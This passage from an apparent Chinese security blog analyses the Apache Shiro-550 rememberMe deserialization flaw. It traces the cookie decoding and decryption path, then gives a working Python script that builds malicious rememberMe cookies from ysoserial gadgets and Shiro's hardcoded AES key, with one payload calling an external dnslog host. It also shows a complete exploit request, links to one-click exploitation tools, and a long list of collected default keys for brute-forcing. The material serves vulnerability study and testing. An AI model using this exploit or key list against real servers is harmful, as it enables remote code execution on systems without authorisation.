BlNQgRqGJJlptBGaO4LPkkurUTR13pxG1m4RSnqOVU5WG1MlbqzuyOzTnfPdYnXMa9T1h7wu8ZS4AM3MbL1x9QaiSmarFY5VOXvD6dsqd2NB0TaygMcKdK4MGZw31WzstNogZP&#x2F;GJT&#x2F;NNbtUkwfuGqBiih1RcrRFYgpa1rRts8dNvgvKU1IuflgeExBJV7EdNQAmRS7D5mzTT4ucZVSisjJtletnX&#x2F;PrzUts&#x2F;lEFDx15KQDsiWqgmY+Bcoq9kql6&#x2F;uSSyvAxGAqIkQ9nNwl9Au+I1q6gsLA1DFuCOZDtWll7Cq4cxDj0&#x2F;0hv270ADMiWllgEKXyyXDte92Cyi7XkZKI6m3pVqxpfwrS6AzNARw&#x2F;h3PB&#x2F;c43vREo8OWKvG5HoUqMsNEdV2CCU44xMyh&#x2F;QnA3TdBTT1tLUvONPgQ9JndCzJ17Rtp&#x2F;iYWsNRj8LvcNRB2QlF3bJU1RmOecFGY7+yNMqEFCPTjjTykpP9lzEF+aH4A+rE3x9YZ&#x2F;YztXJ4T4qKC+Jl3rhPsI2NtzyP1hWo5lGdHFy7HNBNd8fWqKTXlvH4aZjMMPd1PD5KVskK&#x2F;tKTUXf4sKct0HFQk4szDtBeIywIER+k8y6PhUy7cUEKamZyPguUXhSz1yd4Bo4o88PQJdWPSwsMKmqS&#x2F;pDh1AEP+XTmL4Qim3m&#x2F;z0PFgCh+rXMmmbWPP1B4SB1wgVIyfvGOFxspbTD4brMR4Q1B7hU3VDS&#x2F;amnfXSGcsn0u7Ersde1IjncGgPcR4G6ZIgI6D3MvrnEikMEdAL+0HdIZ6JIslePkTWJXrWb4O2VI6rLHZ1e1Q0eyRxZO&#x2F;uQmr6NN7QYVgdlrJUWA7tLH+EOGihgwPg6F3kzsiEQMbRx9yfA83bVTgug&#x3D;&#x3D;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username&#x3D;root&amp;password&#x3D;secret&amp;rememberMe&#x3D;on&amp;submit&#x3D;Login</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210503215107559.png" alt="image-20210503215107559"></p><p>下面的<code>getRememberSerializedIdentity</code>主要用于提取cookie并进行base64解码操作，而<code>convertBytesToPrincipals</code>主要用于AES解密：</p><p><img src="/images/image-20210503215538202.png" alt="image-20210503215538202"></p><p>之后跟进<code>getRememberedSerializedIdentity</code>，在此处会调用getCookie来检索Cookie：</p><p><img src="/images/image-20210503215921974.png" alt="image-20210503215921974"></p><p>RememberMe Cookie从这里获得赋值给base64</p><p>接着调用了Base64解密操作：</p><p><img src="/images/image-20210503220959758.png" alt="image-20210503220959758"></p><p>之后回到<code>getRememberedPrincipals</code>函数，接着会进入到<code>convertBytesToPrincipals</code>函数中，进行AES解密和反序列化：</p><p><img src="/images/image-20210503221210264.png" alt="image-20210503221210264"></p><p>跟进<code>convertBytesToPrincipals</code>函数，可以看到此处会先进行AES解密，之后将解密的结果反序列化后返回：</p><p><img src="/images/image-20210503221450196.png" alt="image-20210503221450196"></p><p>下面跟进<code>decrypt</code>方法，可以看到此处会继续调用<code>cipherService.decrypt</code>：</p><p><img src="/images/image-20210503221654754.png" alt="image-20210503221654754"></p><p>下面继续跟进，最终调用<code>decrypt</code>函数：</p><p><img src="/images/image-20210503221916163.png" alt="image-20210503221916163"></p><p>之后返回AES解密后的数据：</p><p><img src="/images/image-20210503222307692.png" alt="image-20210503222307692"></p><p>之后进入到<code>deserialize</code>中，继续跟进：</p><p><img src="/images/image-20210503222500580.png" alt="image-20210503222500580"></p><p><img src="/images/image-20210503222537775.png" alt="image-20210503222537775"></p><p>最后会进入到进<code>DefaultSerializer</code>类的<code>deserialize</code>函数，并在此处调用<code>readobject</code>完成反序列化操作，从而触发反序列化操作：</p><p><img src="/images/image-20210503222940249.png" alt="image-20210503222940249"></p><p>执行成功</p><p><img src="/images/image-20210503224249440.png" alt="image-20210503224249440"></p><hr><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里提供一种较为简单的漏洞检测方式——ysoserial的<code>CommonsCollections2</code> 、<code>URLDNS</code>这两个Gadget + calc，生成cookie脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;CommonsCollections2&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dnslog</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">payload = encode_rememberme(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line"></span><br><span class="line">payload1 = encode_rememberme(<span class="string">&#x27;http://tux1ii.dnslog.cn&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload1.decode()))</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210503231929485.png" alt="image-20210503231929485"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberMe&#x3D;4GexX11TSwafNB0M7aX3YxoKgCtYYiQ6HgIEAwd3dYkKfA8U+cR6JImhOK58viKQq31TQDxxekJ4grergYIFtEodhUAgJWrI3PuD&#x2F;fZ21MR+Yn5Z2r8JBWiZ+Djd4mTN7xqov1N69Nox+1YfMhcJ9FE&#x2F;OTyey+JCgnIWTDhGPDA17DIOFFGeGQN3a7L7IxEWPk0brY8ktoIPW3MJ&#x2F;gatW0pARYps5JRyKK9C58Dn8xS1Ww9iCpBT+iaOPCuAgytAapTMcICRQP2mXbdoMIKW+mycw&#x2F;quS&#x2F;SMHurzWfV6+XTiX0Xs7bTrPHqiTC2hx+xtAO4i27jZiCL+e58p&#x2F;nzmIVBMU9UT6N90p6yGBkLb0jOt1Jfo7Um8ZwMzcH3g3gbbcbbNxIDwEdZ4tdKRIAsTZPI1MB4w2QLdOzJKY&#x2F;c4i+0iVq1NMd1793ajuAeYEAS+SltM9dQAG7BmCkE4ePk&#x2F;c&#x2F;YbwJv1Ju5kWjggWEazkfhJojaFCCk8GR3s8uyxkI4XQPpKjv+gbttBXtg3TVs5TzEpkup4FESJdbTwMggeRrSzkcjmxiHQ5FNiqLNE6rE0erDAUM1w96iTtL8Q2bfu1UCtRLBO2vbYu&#x2F;kuuMX4ofZNS4p8qka5hn2L2GIZuH+FjiyO9mMmCvbtpcwcjLpJSoUWkI66LWK5hJSzXjo4c+gWLr6JcnUYGkykBabfBmtLUVvEhizDfyLangju0pktEydBsfZ&#x2F;icC8v8icYNgWVxRfulO2c3zqj2UdAitbkTYYFqluVfQ1Tq&#x2F;UdFaxCLaoakouktucmZMvuEsZqEJM8P8kvD0KpAUHyc&#x2F;xoJxIlYj9HbdKhf+r8+qPqQpHWvp5OLwJwcwxnlRlBZm+aGmqu2&#x2F;7ffgA9CGJbQ5RBgqKwWJyeuHe99GxUoiFDkIeC5Ga+HsfDGarI7ZRyCCSMT+7&#x2F;+OOf8B9SDCHYcSSS7R0yieRrGUTh4NgZ8cIlg&#x2F;MNzoMYYhl1i4ddU8CuczuBJovcedzYHrNykxzAUPh3Ftq6fFtsHeLpui7s09ZMdAagMK5yYU+e6l8PMyR3EcVuL8vvf01yujlExxpD5DycxPMnXTrIM0yDLLw96urUCiIAVeZ48MSZYZmB8affRX6haEa3JicK5vMZ8&#x2F;F+1Ixha1G+5GuCalTIK&#x2F;ijtztkU&#x2F;7DRSq&#x2F;TC50HEM5OQ+EwYKFvQa441nQoaEtneuMyjY2HQzes5L12yO2pc8xCK1Q5TkZOBDLs15cAg1nnQti7fUH5ZPzoudwhlzAZX1bmAjkCdIjjWXl8qLgg59Yp5xmmYcT3bcN&#x2F;U1ssBiubzPFKsh7fOxKf7kdc&#x2F;4KJqU1kuwqvaiD2X8LJMZ58BFMk6ST5kHGUDqqrYdbGxUtomZ+6JjA8OoE8b8Eq9aCvEQc04Qt1Jj2f4iPdJsHo1ywUfYYPV8B7Zr45cONwTDsEIFpcZwhIxkX4MF8NXoF6t0mHvdA0M0k8XM2YwePbFozqxCkQ0CMOFHCvyWhsWM559OYhIi8cDWmutOSD+XHVsYDrq+eof5AC7Timd&#x2F;IIlNwzmoZMnorqAc3C5WtlPqgf0ZSjYr66h+pSfseSZMOqXW9tQwyDqs+Z5fisSeviQOsiW4wg36q54DMpR&#x2F;6xM9cKT3TWYsn8CkVeVKDSNDCZT5w5zJUpjnI48y&#x2F;2ZB&#x2F;bwmMKHH3qyLCCsfLkmntwnjqtJ3Y2TY7gc9w+A2CEWHmBfJ1XLzpmb0FVVHpBYweiwNZ45U6RtRHl4f1SNwSCYxnrYphURfFyoNAbEXTSdgyN7qW9IbdarspGX7b8nqzpf3Z6YVfRcdfJSPcGV86f&#x2F;OuM&#x2F;2hIC9iIZIIX2JRJpQl3YFP144QGAZuxeMRpHrAQyxCAGUbcTx4kjevCHJ8+VFgBZp&#x2F;olJmJlt4OFyb0sPOPfb2UCX+Gg1QnWV</span><br></pre></td></tr></table></figure><p>burp发送以下请求包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;samples_web_war&#x2F;login.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko&#x2F;20100101 Firefox&#x2F;88.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 56</span><br><span class="line">Origin: http:&#x2F;&#x2F;localhost:8081</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost:8081&#x2F;samples_web_war&#x2F;login.jsp</span><br><span class="line">Cookie: rememberMe&#x3D;4GexX11TSwafNB0M7aX3YxoKgCtYYiQ6HgIEAwd3dYkKfA8U+cR6JImhOK58viKQq31TQDxxekJ4grergYIFtEodhUAgJWrI3PuD&#x2F;fZ21MR+Yn5Z2r8JBWiZ+Djd4mTN7xqov1N69Nox+1YfMhcJ9FE&#x2F;OTyey+JCgnIWTDhGPDA17DIOFFGeGQN3a7L7IxEWPk0brY8ktoIPW3MJ&#x2F;gatW0pARYps5JRyKK9C58Dn8xS1Ww9iCpBT+iaOPCuAgytAapTMcICRQP2mXbdoMIKW+mycw&#x2F;quS&#x2F;SMHurzWfV6+XTiX0Xs7bTrPHqiTC2hx+xtAO4i27jZiCL+e58p&#x2F;nzmIVBMU9UT6N90p6yGBkLb0jOt1Jfo7Um8ZwMzcH3g3gbbcbbNxIDwEdZ4tdKRIAsTZPI1MB4w2QLdOzJKY&#x2F;c4i+0iVq1NMd1793ajuAeYEAS+SltM9dQAG7BmCkE4ePk&#x2F;c&#x2F;YbwJv1Ju5kWjggWEazkfhJojaFCCk8GR3s8uyxkI4XQPpKjv+gbttBXtg3TVs5TzEpkup4FESJdbTwMggeRrSzkcjmxiHQ5FNiqLNE6rE0erDAUM1w96iTtL8Q2bfu1UCtRLBO2vbYu&#x2F;kuuMX4ofZNS4p8qka5hn2L2GIZuH+FjiyO9mMmCvbtpcwcjLpJSoUWkI66LWK5hJSzXjo4c+gWLr6JcnUYGkykBabfBmtLUVvEhizDfyLangju0pktEydBsfZ&#x2F;icC8v8icYNgWVxRfulO2c3zqj2UdAitbkTYYFqluVfQ1Tq&#x2F;UdFaxCLaoakouktucmZMvuEsZqEJM8P8kvD0KpAUHyc&#x2F;xoJxIlYj9HbdKhf+r8+qPqQpHWvp5OLwJwcwxnlRlBZm+aGmqu2&#x2F;7ffgA9CGJbQ5RBgqKwWJyeuHe99GxUoiFDkIeC5Ga+HsfDGarI7ZRyCCSMT+7&#x2F;+OOf8B9SDCHYcSSS7R0yieRrGUTh4NgZ8cIlg&#x2F;MNzoMYYhl1i4ddU8CuczuBJovcedzYHrNykxzAUPh3Ftq6fFtsHeLpui7s09ZMdAagMK5yYU+e6l8PMyR3EcVuL8vvf01yujlExxpD5DycxPMnXTrIM0yDLLw96urUCiIAVeZ48MSZYZmB8affRX6haEa3JicK5vMZ8&#x2F;F+1Ixha1G+5GuCalTIK&#x2F;ijtztkU&#x2F;7DRSq&#x2F;TC50HEM5OQ+EwYKFvQa441nQoaEtneuMyjY2HQzes5L12yO2pc8xCK1Q5TkZOBDLs15cAg1nnQti7fUH5ZPzoudwhlzAZX1bmAjkCdIjjWXl8qLgg59Yp5xmmYcT3bcN&#x2F;U1ssBiubzPFKsh7fOxKf7kdc&#x2F;4KJqU1kuwqvaiD2X8LJMZ58BFMk6ST5kHGUDqqrYdbGxUtomZ+6JjA8OoE8b8Eq9aCvEQc04Qt1Jj2f4iPdJsHo1ywUfYYPV8B7Zr45cONwTDsEIFpcZwhIxkX4MF8NXoF6t0mHvdA0M0k8XM2YwePbFozqxCkQ0CMOFHCvyWhsWM559OYhIi8cDWmutOSD+XHVsYDrq+eof5AC7Timd&#x2F;IIlNwzmoZMnorqAc3C5WtlPqgf0ZSjYr66h+pSfseSZMOqXW9tQwyDqs+Z5fisSeviQOsiW4wg36q54DMpR&#x2F;6xM9cKT3TWYsn8CkVeVKDSNDCZT5w5zJUpjnI48y&#x2F;2ZB&#x2F;bwmMKHH3qyLCCsfLkmntwnjqtJ3Y2TY7gc9w+A2CEWHmBfJ1XLzpmb0FVVHpBYweiwNZ45U6RtRHl4f1SNwSCYxnrYphURfFyoNAbEXTSdgyN7qW9IbdarspGX7b8nqzpf3Z6YVfRcdfJSPcGV86f&#x2F;OuM&#x2F;2hIC9iIZIIX2JRJpQl3YFP144QGAZuxeMRpHrAQyxCAGUbcTx4kjevCHJ8+VFgBZp&#x2F;olJmJlt4OFyb0sPOPfb2UCX+Gg1QnWV</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username&#x3D;root&amp;password&#x3D;secret&amp;rememberMe&#x3D;on&amp;submit&#x3D;Login</span><br></pre></td></tr></table></figure><p>即成功触发计算器</p><p><img src="/images/image-20210503232055507.png" alt="image-20210503232055507"></p><hr><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><ul><li>飞鸿大佬的一键利用工具：<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></li><li>Shiro-550-with-NoCC：<a href="https://github.com/dr0op/shiro-550-with-NoCC">https://github.com/dr0op/shiro-550-with-NoCC</a></li><li>shiro_attack：<a href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></li><li>burp插件：<a href="https://github.com/pmiaowu/BurpShiroPassiveScan%E3%80%81https://github.com/potats0/shiroPoc">https://github.com/pmiaowu/BurpShiroPassiveScan、https://github.com/potats0/shiroPoc</a></li><li>ysoserial：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></li><li>xray：<a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></li></ul><hr><h2 id="收集的key"><a href="#收集的key" class="headerlink" title="收集的key"></a>收集的key</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;</span><br><span class="line">bWljcm9zAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">MTIzNDU2Nzg5MGFiY2RlZg&#x3D;&#x3D;</span><br><span class="line">zSyK5Kp6PZAAjlT+eeNMlg&#x3D;&#x3D;</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">bXdrXl9eNjY2KjA3Z2otPQ&#x3D;&#x3D;</span><br><span class="line">fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</span><br><span class="line">1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;</span><br><span class="line">L7RioUULEFhRyxM7a2R&#x2F;Yg&#x3D;&#x3D;</span><br><span class="line">r0e3c16IdVkouZgk1TKVMg&#x3D;&#x3D;</span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ&#x3D;&#x3D;</span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ&#x3D;&#x3D;</span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw&#x3D;&#x3D;</span><br><span class="line">ZAvph3dsQs0FSL3SDFAdag&#x3D;&#x3D;</span><br><span class="line">tiVV6g3uZBGfgshesAQbjA&#x3D;&#x3D;</span><br><span class="line">cmVtZW1iZXJNZQAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">ZnJlc2h6Y24xMjM0NTY3OA&#x3D;&#x3D;</span><br><span class="line">RVZBTk5JR0hUTFlfV0FPVQ&#x3D;&#x3D;</span><br><span class="line">WkhBTkdYSUFPSEVJX0NBVA&#x3D;&#x3D;</span><br><span class="line">GsHaWo4m1eNbE0kNSMULhg&#x3D;&#x3D;</span><br><span class="line">l8cc6d2xpkT1yFtLIcLHCg&#x3D;&#x3D;</span><br><span class="line">KU471rVNQ6k7PQL4SqxgJg&#x3D;&#x3D;</span><br><span class="line">0AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">1AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">25BsmdYwjnfcWmnhAciDDg&#x3D;&#x3D;</span><br><span class="line">3JvYhmBLUs0ETA5Kprsdag&#x3D;&#x3D;</span><br><span class="line">6AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">6NfXkC7YVCV5DASIrEm1Rg&#x3D;&#x3D;</span><br><span class="line">7AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">8AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">8BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span 